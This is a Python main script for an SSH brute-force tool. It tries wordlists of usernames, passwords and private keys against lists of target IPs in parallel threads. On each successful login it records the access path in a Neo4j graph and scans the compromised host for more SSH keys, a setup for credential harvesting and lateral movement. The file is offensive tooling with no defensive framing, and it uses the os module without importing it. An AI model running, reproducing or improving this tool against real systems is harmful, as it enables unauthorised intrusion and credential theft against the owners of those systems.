import argparse
import threading
from ssh_brute_project.logger import setup_logger
from ssh_brute_project.modules import bruteforce, graphdb, key_scanner
from ssh_brute_project.config import CONFIG

logger = setup_logger()
graph = graphdb.GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])

def handle_target(target, users, passwords, keyfiles):
    results = bruteforce.try_all(target, users, passwords, keyfiles)
    for res in results:
        logger.info(f"[{target}] Success: {res.user}@{target} using {res.method}")
        graph.add_ssh_path(CONFIG["origin_host"], target, res.user, res.method)
        ssh_conn = res.get_ssh_connection()
        keys_found = key_scanner.find_keys(ssh_conn)
        logger.info(f"[{target}] Keys found: {keys_found}")
        ssh_conn.close()

def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforcer with Neo4j logging")
    parser.add_argument("targets", nargs="+", help="List of target IPs")
    parser.add_argument("--users", default="wordlists/users.txt")
    parser.add_argument("--passwords", default="wordlists/passwords.txt")
    parser.add_argument("--keys", default="wordlists/keys/", help="Path to SSH private keys")

    args = parser.parse_args()
    with open(args.users) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]
    keyfiles = [os.path.join(args.keys, f) for f in os.listdir(args.keys)]

    threads = []
    for target in args.targets:
        t = threading.Thread(target=handle_target, args=(target, users, passwords, keyfiles))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    graph.close()

if __name__ == "__main__":
    main()
